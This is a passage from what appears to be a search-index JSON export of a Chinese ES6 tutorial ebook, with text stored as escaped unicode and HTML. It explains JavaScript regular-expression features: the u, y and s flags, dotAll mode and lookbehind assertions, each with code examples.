\u7f16\u7801\uff0c\u4f1a\u5c06\u5176\u8bc6\u522b\u4e3a\u4e24\u4e2a\u5b57\u7b26\uff0c\u5bfc\u81f4\u7b2c\u4e8c\u884c\u4ee3\u7801\u7ed3\u679c\u4e3a<code>true</code>\u3002\u52a0\u4e86<code>u</code>\u4fee\u9970\u7b26\u4ee5\u540e\uff0cES6 \u5c31\u4f1a\u8bc6\u522b\u5176\u4e3a\u4e00\u4e2a\u5b57\u7b26\uff0c\u6240\u4ee5\u7b2c\u4e00\u884c\u4ee3\u7801\u7ed3\u679c\u4e3a<code>false</code>\u3002</p> <p>\u4e00\u65e6\u52a0\u4e0a<code>u</code>\u4fee\u9970\u7b26\u53f7\uff0c\u5c31\u4f1a\u4fee\u6539\u4e0b\u9762\u8fd9\u4e9b\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u884c\u4e3a\u3002</p> <p>\uff081\uff09\u70b9\u5b57\u7b26</p> <p>\u70b9\uff08<code>.</code>\uff09\u5b57\u7b26\u5728\u6b63\u5219\u8868\u8fbe\u5f0f\u4e2d\uff0c\u542b\u4e49\u662f\u9664\u4e86\u6362\u884c\u7b26\u4ee5\u5916\u7684\u4efb\u610f\u5355\u4e2a\u5b57\u7b26\u3002\u5bf9\u4e8e\u7801\u70b9\u5927\u4e8e<code>0xFFFF</code>\u7684 Unicode \u5b57\u7b26\uff0c\u70b9\u5b57\u7b26\u4e0d\u80fd\u8bc6\u522b\uff0c\u5fc5\u987b\u52a0\u4e0a<code>u</code>\u4fee\u9970\u7b26\u3002</p> <pre><code>var s = '\ud842\udfb7';\n\n/^.$/.test(s) // false\n/^.$/u.test(s) // true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u5982\u679c\u4e0d\u6dfb\u52a0<code>u</code>\u4fee\u9970\u7b26\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u5c31\u4f1a\u8ba4\u4e3a\u5b57\u7b26\u4e32\u4e3a\u4e24\u4e2a\u5b57\u7b26\uff0c\u4ece\u800c\u5339\u914d\u5931\u8d25\u3002</p> <p>\uff082\uff09Unicode \u5b57\u7b26\u8868\u793a\u6cd5</p> <p>ES6 \u65b0\u589e\u4e86\u4f7f\u7528\u5927\u62ec\u53f7\u8868\u793a Unicode \u5b57\u7b26\uff0c\u8fd9\u79cd\u8868\u793a\u6cd5\u5728\u6b63\u5219\u8868\u8fbe\u5f0f\u4e2d\u5fc5\u987b\u52a0\u4e0a<code>u</code>\u4fee\u9970\u7b26\uff0c\u624d\u80fd\u8bc6\u522b\u5f53\u4e2d\u7684\u5927\u62ec\u53f7\uff0c\u5426\u5219\u4f1a\u88ab\u89e3\u8bfb\u4e3a\u91cf\u8bcd\u3002</p> <pre><code>/\\u{61}/.test('a') // false\n/\\u{61}/u.test('a') // true\n/\\u{20BB7}/u.test('\ud842\udfb7') // true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u5982\u679c\u4e0d\u52a0<code>u</code>\u4fee\u9970\u7b26\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u65e0\u6cd5\u8bc6\u522b<code>\\u{61}</code>\u8fd9\u79cd\u8868\u793a\u6cd5\uff0c\u53ea\u4f1a\u8ba4\u4e3a\u8fd9\u5339\u914d 61 \u4e2a\u8fde\u7eed\u7684<code>u</code>\u3002</p> <p>\uff083\uff09\u91cf\u8bcd</p> <p>\u4f7f\u7528<code>u</code>\u4fee\u9970\u7b26\u540e\uff0c\u6240\u6709\u91cf\u8bcd\u90fd\u4f1a\u6b63\u786e\u8bc6\u522b\u7801\u70b9\u5927\u4e8e<code>0xFFFF</code>\u7684 Unicode \u5b57\u7b26\u3002</p> <pre><code>/a{2}/.test('aa') // true\n/a{2}/u.test('aa') // true\n/\ud842\udfb7{2}/.test('\ud842\udfb7\ud842\udfb7') // false\n/\ud842\udfb7{2}/u.test('\ud842\udfb7\ud842\udfb7') // true\n</code></pre> <p>\uff084\uff09\u9884\u5b9a\u4e49\u6a21\u5f0f</p> <p><code>u</code>\u4fee\u9970\u7b26\u4e5f\u5f71\u54cd\u5230\u9884\u5b9a\u4e49\u6a21\u5f0f\uff0c\u80fd\u5426\u6b63\u786e\u8bc6\u522b\u7801\u70b9\u5927\u4e8e<code>0xFFFF</code>\u7684 Unicode \u5b57\u7b26\u3002</p> <pre><code>/^\\S$/.test('\ud842\udfb7') // false\n/^\\S$/u.test('\ud842\udfb7') // true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u7684<code>\\S</code>\u662f\u9884\u5b9a\u4e49\u6a21\u5f0f\uff0c\u5339\u914d\u6240\u6709\u975e\u7a7a\u767d\u5b57\u7b26\u3002\u53ea\u6709\u52a0\u4e86<code>u</code>\u4fee\u9970\u7b26\uff0c\u5b83\u624d\u80fd\u6b63\u786e\u5339\u914d\u7801\u70b9\u5927\u4e8e<code>0xFFFF</code>\u7684 Unicode \u5b57\u7b26\u3002</p> <p>\u5229\u7528\u8fd9\u4e00\u70b9\uff0c\u53ef\u4ee5\u5199\u51fa\u4e00\u4e2a\u6b63\u786e\u8fd4\u56de\u5b57\u7b26\u4e32\u957f\u5ea6\u7684\u51fd\u6570\u3002</p> <pre><code>function codePointLength(text) {\n  var result = text.match(/[\\s\\S]/gu);\n  return result ? result.length : 0;\n}\n\nvar s = '\ud842\udfb7\ud842\udfb7';\n\ns.length // 4\ncodePointLength(s) // 2\n</code></pre> <p>\uff085\uff09i \u4fee\u9970\u7b26</p> <p>\u6709\u4e9b Unicode \u5b57\u7b26\u7684\u7f16\u7801\u4e0d\u540c\uff0c\u4f46\u662f\u5b57\u578b\u5f88\u76f8\u8fd1\uff0c\u6bd4\u5982\uff0c<code>\\u004B</code>\u4e0e<code>\\u212A</code>\u90fd\u662f\u5927\u5199\u7684<code>K</code>\u3002</p> <pre><code>/[a-z]/i.test('\\u212A') // false\n/[a-z]/iu.test('\\u212A') // true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e0d\u52a0<code>u</code>\u4fee\u9970\u7b26\uff0c\u5c31\u65e0\u6cd5\u8bc6\u522b\u975e\u89c4\u8303\u7684<code>K</code>\u5b57\u7b26\u3002</p> <p>\uff086\uff09\u68c0\u6d4b u \u4fee\u9970\u7b26 unicode \u5c5e\u6027</p> <p>\u6b63\u5219\u5b9e\u4f8b\u5bf9\u8c61\u65b0\u589e<code>unicode</code>\u5c5e\u6027\uff0c\u8868\u793a\u662f\u5426\u8bbe\u7f6e\u4e86<code>u</code>\u4fee\u9970\u7b26\u3002</p> <pre><code>const r1 = /hello/;\nconst r2 = /hello/u;\n\nr1.unicode // false\nr2.unicode // true\n</code></pre>"},{"location":"ebook-JSES6-RYF/06-%E6%AD%A3%E5%88%99/#y","title":"y \u4fee\u9970\u7b26","text":"<p>\u9664\u4e86<code>u</code>\u4fee\u9970\u7b26\uff0cES6 \u8fd8\u4e3a\u6b63\u5219\u8868\u8fbe\u5f0f\u6dfb\u52a0\u4e86<code>y</code>\u4fee\u9970\u7b26\uff0c\u53eb\u505a\u201c\u7c98\u8fde\u201d\uff08sticky\uff09\u4fee\u9970\u7b26\u3002</p> <p><code>y</code>\u4fee\u9970\u7b26\u7684\u4f5c\u7528\u4e0e<code>g</code>\u4fee\u9970\u7b26\u7c7b\u4f3c\uff0c\u4e5f\u662f\u5168\u5c40\u5339\u914d\uff0c\u540e\u4e00\u6b21\u5339\u914d\u90fd\u4ece\u4e0a\u4e00\u6b21\u5339\u914d\u6210\u529f\u7684\u4e0b\u4e00\u4e2a\u4f4d\u7f6e\u5f00\u59cb\u3002\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\uff0c<code>g</code>\u4fee\u9970\u7b26\u53ea\u8981\u5269\u4f59\u4f4d\u7f6e\u4e2d\u5b58\u5728\u5339\u914d\u5c31\u53ef\uff0c\u800c<code>y</code>\u4fee\u9970\u7b26\u786e\u4fdd\u5339\u914d\u5fc5\u987b\u4ece\u5269\u4f59\u7684\u7b2c\u4e00\u4e2a\u4f4d\u7f6e\u5f00\u59cb\uff0c\u8fd9\u4e5f\u5c31\u662f\u201c\u7c98\u8fde\u201d\u7684\u6db5\u4e49\u3002</p> <pre><code>var s = 'aaa_aa_a';\nvar r1 = /a+/g;\nvar r2 = /a+/y;\n\nr1.exec(s) // [\"aaa\"]\nr2.exec(s) // [\"aaa\"]\n\nr1.exec(s) // [\"aa\"]\nr2.exec(s) // null\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u6709\u4e24\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u4e00\u4e2a\u4f7f\u7528<code>g</code>\u4fee\u9970\u7b26\uff0c\u53e6\u4e00\u4e2a\u4f7f\u7528<code>y</code>\u4fee\u9970\u7b26\u3002\u8fd9\u4e24\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\u5404\u6267\u884c\u4e86\u4e24\u6b21\uff0c\u7b2c\u4e00\u6b21\u6267\u884c\u7684\u65f6\u5019\uff0c\u4e24\u8005\u884c\u4e3a\u76f8\u540c\uff0c\u5269\u4f59\u5b57\u7b26\u4e32\u90fd\u662f<code>_aa_a</code>\u3002\u7531\u4e8e<code>g</code>\u4fee\u9970\u6ca1\u6709\u4f4d\u7f6e\u8981\u6c42\uff0c\u6240\u4ee5\u7b2c\u4e8c\u6b21\u6267\u884c\u4f1a\u8fd4\u56de\u7ed3\u679c\uff0c\u800c<code>y</code>\u4fee\u9970\u7b26\u8981\u6c42\u5339\u914d\u5fc5\u987b\u4ece\u5934\u90e8\u5f00\u59cb\uff0c\u6240\u4ee5\u8fd4\u56de<code>null</code>\u3002</p> <p>\u5982\u679c\u6539\u4e00\u4e0b\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u4fdd\u8bc1\u6bcf\u6b21\u90fd\u80fd\u5934\u90e8\u5339\u914d\uff0c<code>y</code>\u4fee\u9970\u7b26\u5c31\u4f1a\u8fd4\u56de\u7ed3\u679c\u4e86\u3002</p> <pre><code>var s = 'aaa_aa_a';\nvar r = /a+_/y;\n\nr.exec(s) // [\"aaa_\"]\nr.exec(s) // [\"aa_\"]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u6bcf\u6b21\u5339\u914d\uff0c\u90fd\u662f\u4ece\u5269\u4f59\u5b57\u7b26\u4e32\u7684\u5934\u90e8\u5f00\u59cb\u3002</p> <p>\u4f7f\u7528<code>lastIndex</code>\u5c5e\u6027\uff0c\u53ef\u4ee5\u66f4\u597d\u5730\u8bf4\u660e<code>y</code>\u4fee\u9970\u7b26\u3002</p> <pre><code>const REGEX = /a/g;\n\n// \u6307\u5b9a\u4ece2\u53f7\u4f4d\u7f6e\uff08y\uff09\u5f00\u59cb\u5339\u914d\nREGEX.lastIndex = 2;\n\n// \u5339\u914d\u6210\u529f\nconst match = REGEX.exec('xaya');\n\n// \u57283\u53f7\u4f4d\u7f6e\u5339\u914d\u6210\u529f\nmatch.index // 3\n\n// \u4e0b\u4e00\u6b21\u5339\u914d\u4ece4\u53f7\u4f4d\u5f00\u59cb\nREGEX.lastIndex // 4\n\n// 4\u53f7\u4f4d\u5f00\u59cb\u5339\u914d\u5931\u8d25\nREGEX.exec('xaya') // null\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>lastIndex</code>\u5c5e\u6027\u6307\u5b9a\u6bcf\u6b21\u641c\u7d22\u7684\u5f00\u59cb\u4f4d\u7f6e\uff0c<code>g</code>\u4fee\u9970\u7b26\u4ece\u8fd9\u4e2a\u4f4d\u7f6e\u5f00\u59cb\u5411\u540e\u641c\u7d22\uff0c\u76f4\u5230\u53d1\u73b0\u5339\u914d\u4e3a\u6b62\u3002</p> <p><code>y</code>\u4fee\u9970\u7b26\u540c\u6837\u9075\u5b88<code>lastIndex</code>\u5c5e\u6027\uff0c\u4f46\u662f\u8981\u6c42\u5fc5\u987b\u5728<code>lastIndex</code>\u6307\u5b9a\u7684\u4f4d\u7f6e\u53d1\u73b0\u5339\u914d\u3002</p> <pre><code>const REGEX = /a/y;\n\n// \u6307\u5b9a\u4ece2\u53f7\u4f4d\u7f6e\u5f00\u59cb\u5339\u914d\nREGEX.lastIndex = 2;\n\n// \u4e0d\u662f\u7c98\u8fde\uff0c\u5339\u914d\u5931\u8d25\nREGEX.exec('xaya') // null\n\n// \u6307\u5b9a\u4ece3\u53f7\u4f4d\u7f6e\u5f00\u59cb\u5339\u914d\nREGEX.lastIndex = 3;\n\n// 3\u53f7\u4f4d\u7f6e\u662f\u7c98\u8fde\uff0c\u5339\u914d\u6210\u529f\nconst match = REGEX.exec('xaya');\nmatch.index // 3\nREGEX.lastIndex // 4\n</code></pre> <p>\u5b9e\u9645\u4e0a\uff0c<code>y</code>\u4fee\u9970\u7b26\u53f7\u9690\u542b\u4e86\u5934\u90e8\u5339\u914d\u7684\u6807\u5fd7<code>^</code>\u3002</p> <pre><code>/b/y.exec('aba')\n// null\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u7531\u4e8e\u4e0d\u80fd\u4fdd\u8bc1\u5934\u90e8\u5339\u914d\uff0c\u6240\u4ee5\u8fd4\u56de<code>null</code>\u3002<code>y</code>\u4fee\u9970\u7b26\u7684\u8bbe\u8ba1\u672c\u610f\uff0c\u5c31\u662f\u8ba9\u5934\u90e8\u5339\u914d\u7684\u6807\u5fd7<code>^</code>\u5728\u5168\u5c40\u5339\u914d\u4e2d\u90fd\u6709\u6548\u3002</p> <p>\u4e0b\u9762\u662f\u5b57\u7b26\u4e32\u5bf9\u8c61\u7684<code>replace</code>\u65b9\u6cd5\u7684\u4f8b\u5b50\u3002</p> <pre><code>const REGEX = /a/gy;\n'aaxa'.replace(REGEX, '-') // '--xa'\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6700\u540e\u4e00\u4e2a<code>a</code>\u56e0\u4e3a\u4e0d\u662f\u51fa\u73b0\u5728\u4e0b\u4e00\u6b21\u5339\u914d\u7684\u5934\u90e8\uff0c\u6240\u4ee5\u4e0d\u4f1a\u88ab\u66ff\u6362\u3002</p> <p>\u5355\u5355\u4e00\u4e2a<code>y</code>\u4fee\u9970\u7b26\u5bf9<code>match</code>\u65b9\u6cd5\uff0c\u53ea\u80fd\u8fd4\u56de\u7b2c\u4e00\u4e2a\u5339\u914d\uff0c\u5fc5\u987b\u4e0e<code>g</code>\u4fee\u9970\u7b26\u8054\u7528\uff0c\u624d\u80fd\u8fd4\u56de\u6240\u6709\u5339\u914d\u3002</p> <pre><code>'a1a2a3'.match(/a\\d/y) // [\"a1\"]\n'a1a2a3'.match(/a\\d/gy) // [\"a1\", \"a2\", \"a3\"]\n</code></pre> <p><code>y</code>\u4fee\u9970\u7b26\u7684\u4e00\u4e2a\u5e94\u7528\uff0c\u662f\u4ece\u5b57\u7b26\u4e32\u63d0\u53d6 token\uff08\u8bcd\u5143\uff09\uff0c<code>y</code>\u4fee\u9970\u7b26\u786e\u4fdd\u4e86\u5339\u914d\u4e4b\u95f4\u4e0d\u4f1a\u6709\u6f0f\u6389\u7684\u5b57\u7b26\u3002</p> <pre><code>const TOKEN_Y = /\\s*(\\+|[0-9]+)\\s*/y;\nconst TOKEN_G  = /\\s*(\\+|[0-9]+)\\s*/g;\n\ntokenize(TOKEN_Y, '3 + 4')\n// [ '3', '+', '4' ]\ntokenize(TOKEN_G, '3 + 4')\n// [ '3', '+', '4' ]\n\nfunction tokenize(TOKEN_REGEX, str) {\n  let result = [];\n  let match;\n  while (match = TOKEN_REGEX.exec(str)) {\n    result.push(match[1]);\n  }\n  return result;\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u5b57\u7b26\u4e32\u91cc\u9762\u6ca1\u6709\u975e\u6cd5\u5b57\u7b26\uff0c<code>y</code>\u4fee\u9970\u7b26\u4e0e<code>g</code>\u4fee\u9970\u7b26\u7684\u63d0\u53d6\u7ed3\u679c\u662f\u4e00\u6837\u7684\u3002\u4f46\u662f\uff0c\u4e00\u65e6\u51fa\u73b0\u975e\u6cd5\u5b57\u7b26\uff0c\u4e24\u8005\u7684\u884c\u4e3a\u5c31\u4e0d\u4e00\u6837\u4e86\u3002</p> <pre><code>tokenize(TOKEN_Y, '3x + 4')\n// [ '3' ]\ntokenize(TOKEN_G, '3x + 4')\n// [ '3', '+', '4' ]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>g</code>\u4fee\u9970\u7b26\u4f1a\u5ffd\u7565\u975e\u6cd5\u5b57\u7b26\uff0c\u800c<code>y</code>\u4fee\u9970\u7b26\u4e0d\u4f1a\uff0c\u8fd9\u6837\u5c31\u5f88\u5bb9\u6613\u53d1\u73b0\u9519\u8bef\u3002</p> <p>sticky \u5c5e\u6027</p> <p>\u4e0e<code>y</code>\u4fee\u9970\u7b26\u76f8\u5339\u914d\uff0cES6 \u7684\u6b63\u5219\u5b9e\u4f8b\u5bf9\u8c61\u591a\u4e86<code>sticky</code>\u5c5e\u6027\uff0c\u8868\u793a\u662f\u5426\u8bbe\u7f6e\u4e86<code>y</code>\u4fee\u9970\u7b26\u3002</p> <pre><code>var r = /hello\\d/y;\nr.sticky // true\n</code></pre>"},{"location":"ebook-JSES6-RYF/06-%E6%AD%A3%E5%88%99/#s","title":"s \u4fee\u9970\u7b26","text":"<p>dotAll \u6a21\u5f0f</p> <p>\u6b63\u5219\u8868\u8fbe\u5f0f\u4e2d\uff0c\u70b9\uff08<code>.</code>\uff09\u662f\u4e00\u4e2a\u7279\u6b8a\u5b57\u7b26\uff0c\u4ee3\u8868\u4efb\u610f\u7684\u5355\u4e2a\u5b57\u7b26\uff0c\u4f46\u662f\u6709\u4e24\u4e2a\u4f8b\u5916\u3002\u4e00\u4e2a\u662f\u56db\u4e2a\u5b57\u8282\u7684 UTF-16 \u5b57\u7b26\uff0c\u8fd9\u4e2a\u53ef\u4ee5\u7528<code>u</code>\u4fee\u9970\u7b26\u89e3\u51b3\uff1b\u53e6\u4e00\u4e2a\u662f\u884c\u7ec8\u6b62\u7b26\uff08line terminator character\uff09\u3002</p> <p>\u6240\u8c13\u884c\u7ec8\u6b62\u7b26\uff0c\u5c31\u662f\u8be5\u5b57\u7b26\u8868\u793a\u4e00\u884c\u7684\u7ec8\u7ed3\u3002\u4ee5\u4e0b\u56db\u4e2a\u5b57\u7b26\u5c5e\u4e8e\u201c\u884c\u7ec8\u6b62\u7b26\u201d\u3002</p> <ul> <li>U+000A \u6362\u884c\u7b26\uff08<code>\\n</code>\uff09</li> <li>U+000D \u56de\u8f66\u7b26\uff08<code>\\r</code>\uff09</li> <li>U+2028 \u884c\u5206\u9694\u7b26\uff08line separator\uff09</li> <li>U+2029 \u6bb5\u5206\u9694\u7b26\uff08paragraph separator\uff09</li> </ul> <pre><code>/foo.bar/.test('foo\\nbar')\n// false\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u56e0\u4e3a<code>.</code>\u4e0d\u5339\u914d<code>\\n</code>\uff0c\u6240\u4ee5\u6b63\u5219\u8868\u8fbe\u5f0f\u8fd4\u56de<code>false</code>\u3002</p> <p>\u4f46\u662f\uff0c\u5f88\u591a\u65f6\u5019\u6211\u4eec\u5e0c\u671b\u5339\u914d\u7684\u662f\u4efb\u610f\u5355\u4e2a\u5b57\u7b26\uff0c\u8fd9\u65f6\u6709\u4e00\u79cd\u53d8\u901a\u7684\u5199\u6cd5\u3002</p> <pre><code>/foo[^]bar/.test('foo\\nbar')\n// true\n</code></pre> <p>\u8fd9\u79cd\u89e3\u51b3\u65b9\u6848\u6bd5\u7adf\u4e0d\u592a\u7b26\u5408\u76f4\u89c9\uff0cES2018 \u5f15\u5165<code>s</code>\u4fee\u9970\u7b26\uff0c\u4f7f\u5f97<code>.</code>\u53ef\u4ee5\u5339\u914d\u4efb\u610f\u5355\u4e2a\u5b57\u7b26\u3002</p> <pre><code>/foo.bar/s.test('foo\\nbar') // true\n</code></pre> <p>\u8fd9\u88ab\u79f0\u4e3a<code>dotAll</code>\u6a21\u5f0f\uff0c\u5373\u70b9\uff08dot\uff09\u4ee3\u8868\u4e00\u5207\u5b57\u7b26\u3002\u6240\u4ee5\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u8fd8\u5f15\u5165\u4e86\u4e00\u4e2a<code>dotAll</code>\u5c5e\u6027\uff0c\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5\u6b63\u5219\u8868\u8fbe\u5f0f\u662f\u5426\u5904\u5728<code>dotAll</code>\u6a21\u5f0f\u3002</p> <pre><code>const re = /foo.bar/s;\n// \u53e6\u4e00\u79cd\u5199\u6cd5\n// const re = new RegExp('foo.bar', 's');\n\nre.test('foo\\nbar') // true\nre.dotAll // true\nre.flags // 's'\n</code></pre> <p><code>/s</code>\u4fee\u9970\u7b26\u548c\u591a\u884c\u4fee\u9970\u7b26<code>/m</code>\u4e0d\u51b2\u7a81\uff0c\u4e24\u8005\u4e00\u8d77\u4f7f\u7528\u7684\u60c5\u51b5\u4e0b\uff0c<code>.</code>\u5339\u914d\u6240\u6709\u5b57\u7b26\uff0c\u800c<code>^</code>\u548c<code>$</code>\u5339\u914d\u6bcf\u4e00\u884c\u7684\u884c\u9996\u548c\u884c\u5c3e\u3002</p>"},{"location":"ebook-JSES6-RYF/06-%E6%AD%A3%E5%88%99/#_5","title":"\u540e\u884c\u65ad\u8a00","text":"<p>JavaScript \u8bed\u8a00\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u53ea\u652f\u6301\u5148\u884c\u65ad\u8a00\uff08lookahead\uff09\u548c\u5148\u884c\u5426\u5b9a\u65ad\u8a00\uff08negative lookahead\uff09\uff0c\u4e0d\u652f\u6301\u540e\u884c\u65ad\u8a00\uff08lookbehind\uff09\u548c\u540e\u884c\u5426\u5b9a\u65ad\u8a00\uff08negative lookbehind\uff09\u3002ES2018 \u5f15\u5165\u540e\u884c\u65ad\u8a00\uff0cV8 \u5f15\u64ce 4.9 \u7248\uff08Chrome 62\uff09\u5df2\u7ecf\u652f\u6301\u3002</p> <p>\u201c\u5148\u884c\u65ad\u8a00\u201d\u6307\u7684\u662f\uff0c<code>x</code>\u53ea\u6709\u5728<code>y</code>\u524d\u9762\u624d\u5339\u914d\uff0c\u5fc5\u987b\u5199\u6210<code>/x(?=y)/</code>\u3002\u6bd4\u5982\uff0c\u53ea\u5339\u914d\u767e\u5206\u53f7\u4e4b\u524d\u7684\u6570\u5b57\uff0c\u8981\u5199\u6210<code>/\\d+(?=%)/</code>\u3002\u201c\u5148\u884c\u5426\u5b9a\u65ad\u8a00\u201d\u6307\u7684\u662f\uff0c<code>x</code>\u53ea\u6709\u4e0d\u5728<code>y</code>\u524d\u9762\u624d\u5339\u914d\uff0c\u5fc5\u987b\u5199\u6210<code>/x(?!y)/</code>\u3002\u6bd4\u5982\uff0c\u53ea\u5339\u914d\u4e0d\u5728\u767e\u5206\u53f7\u4e4b\u524d\u7684\u6570\u5b57\uff0c\u8981\u5199\u6210<code>/\\d+(?!%)/</code>\u3002</p> <pre><code>/\\d+(?=%)/.exec('100% of US presidents have been male')  // [\"100\"]\n/\\d+(?!%)/.exec('that\u2019s all 44 of them')                 // [\"44\"]\n</code></pre> <p>\u4e0a\u9762\u4e24\u4e2a\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u4e92\u6362\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u5c31\u4e0d\u4f1a\u5f97\u5230\u76f8\u540c\u7ed3\u679c\u3002\u53e6\u5916\uff0c\u8fd8\u53ef\u4ee5\u770b\u5230\uff0c\u201c\u5148\u884c\u65ad\u8a00\u201d\u62ec\u53f7\u4e4b\u4e2d\u7684\u90e8\u5206\uff08<code>(?=%)</code>\uff09\uff0c\u662f\u4e0d\u8ba1\u5165\u8fd4\u56de\u7ed3\u679c\u7684\u3002</p> <p>\u201c\u540e\u884c\u65ad\u8a00\u201d\u6b63\u597d\u4e0e\u201c\u5148\u884c\u65ad\u8a00\u201d\u76f8\u53cd\uff0c<code>x</code>\u53ea\u6709\u5728<code>y</code>\u540e\u9762\u624d\u5339\u914d\uff0c\u5fc5\u987b\u5199\u6210<code>/(?&lt;=y)x/</code>\u3002\u6bd4\u5982\uff0c\u53ea\u5339\u914d\u7f8e\u5143\u7b26\u53f7\u4e4b\u540e\u7684\u6570\u5b57\uff0c\u8981\u5199\u6210<code>/(?&lt;=\\$)\\d+/</code>\u3002\u201c\u540e\u884c\u5426\u5b9a\u65ad\u8a00\u201d\u5219\u4e0e\u201c\u5148\u884c\u5426\u5b9a\u65ad\u8a00\u201d\u76f8\u53cd\uff0c<code>x</code>\u53ea\u6709\u4e0d\u5728<code>y</code>\u540e\u9762\u624d\u5339\u914d\uff0c\u5fc5\u987b\u5199\u6210<code>/(?&lt;!y)x/</code>\u3002\u6bd4\u5982\uff0c\u53ea\u5339\u914d\u4e0d\u5728\u7f8e\u5143\u7b26\u53f7\u540e\u9762\u7684\u6570\u5b57\uff0c\u8981\u5199\u6210<code>/(?&lt;!\\$)\\d+/</code>\u3002</p> <pre><code>/(?&lt;=\\$)\\d+/.exec('Benjamin Franklin is on the $100 bill')  // [\"100\"]\n/(?&lt;!\\$)\\d+/.exec('it\u2019s is worth about \u20ac90')                // [\"90\"]\n</code></pre> <p>\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c\u201c\u540e\u884c\u65ad\u8a00\u201d\u7684\u62ec\u53f7\u4e4b\u4e2d\u7684\u90e8\u5206\uff08<code>(?&lt;=\\$)</code>\uff09\uff0c\u4e5f\u662f\u4e0d\u8ba1\u5165\u8fd4\u56de\u7ed3\u679c\u3002</p> <p>\u4e0b\u9762\u7684\u4f8b\u5b50\u662f\u4f7f\u7528\u540e\u884c\u65ad\u8a00\u8fdb\u884c\u5b57\u7b26\u4e32\u66ff\u6362\u3002</p> <pre><code>const RE_DOLLAR_PREFIX = /(?&lt;=\\$)foo/g;\n'$foo %foo foo'.replace(RE_DOLLAR_PREFIX, 'bar');\n// '$bar %foo foo'\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53ea\u6709\u5728\u7f8e\u5143\u7b26\u53f7\u540e\u9762\u7684<code>foo</code>\u624d\u4f1a\u88ab\u66ff\u6362\u3002</p> <p>\u201c\u540e\u884c\u65ad\u8a00\u201d\u7684\u5b9e\u73b0\uff0c\u9700\u8981\u5148\u5339\u914d<code>/(?&lt;=y)x/</code>\u7684<code>x</code>\uff0c\u7136\u540e\u518d\u56de\u5230\u5de6\u8fb9\uff0c\u5339\u914d<code>y</code>\u7684\u90e8\u5206\u3002\u8fd9\u79cd\u201c\u5148\u53f3\u540e\u5de6\u201d\u7684\u6267\u884c\u987a\u5e8f\uff0c\u4e0e\u6240\u6709\u5176\u4ed6\u6b63\u5219\u64cd\u4f5c\u76f8\u53cd\uff0c\u5bfc\u81f4\u4e86\u4e00\u4e9b\u4e0d\u7b26\u5408\u9884\u671f\u7684\u884c\u4e3a\u3002</p> <p>\u9996\u5148\uff0c\u540e\u884c\u65ad\u8a00\u7684\u7ec4\u5339\u914d\uff0c\u4e0e\u6b63\u5e38\u60c5\u51b5\u4e0b\u7ed3\u679c\u662f\u4e0d\u4e00\u6837\u7684\u3002</p> <pre><code>/(?&lt;=(\\d+)(\\d+))$/.exec('1053') // [\"\", \"1\", \"053\"]\n/^(\\d+)(\\d+)$/.exec('1053') // [\"1053\", \"105\", \"3\"]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u9700\u8981\u6355\u6349\u4e24\u4e2a\u7ec4\u5339\u914d\u3002\u6ca1\u6709\u201c\u540e\u884c\u65ad\u8a00\u201d\u65f6\uff0c\u7b2c\u4e00\u4e2a\u62ec\u53f7\u662f\u8d2a\u5a6a\u6a21\u5f0f\uff0c\u7b2c\u4e8c\u4e2a\u62ec\u53f7\u53ea\u80fd\u6355\u83b7\u4e00\u4e2a\u5b57\u7b26\uff0c\u6240\u4ee5\u7ed3\u679c\u662f<code>105</code>\u548c<code>3</code>\u3002\u800c\u201c\u540e\u884c\u65ad\u8a00\u201d\u65f6\uff0c\u7531\u4e8e\u6267\u884c\u987a\u5e8f\u662f\u4ece\u53f3\u5230\u5de6\uff0c\u7b2c\u4e8c\u4e2a\u62ec\u53f7\u662f\u8d2a\u5a6a\u6a21\u5f0f\uff0c\u7b2c\u4e00\u4e2a\u62ec\u53f7\u53ea\u80fd\u6355\u83b7\u4e00\u4e2a\u5b57\u7b26\uff0c\u6240\u4ee5\u7ed3\u679c\u662f<code>1</code>\u548c<code>053</code>\u3002</p> <p>\u5176\u6b21\uff0c\u201c\u540e\u884c\u65ad\u8a00\u201d\u7684\u53cd\u659c\u6760\u5f15\u7528\uff0c\u4e5f\u4e0e\u901a\u5e38\u7684\u987a\u5e8f\u76f8\u53cd\uff0c\u5fc5\u987b\u653e\u5728\u5bf9\u5e94\u7684\u90a3\u4e2a\u62ec\u53f7\u4e4b\u524d\u3002</p> <pre><code>/(?&lt;=(o)d\\1)r/.exec('hodor')  // null\n/(?&lt;=\\1d(o))r/.exec('hodor')  // [\"r\", \"o\"]\n</code></pre> 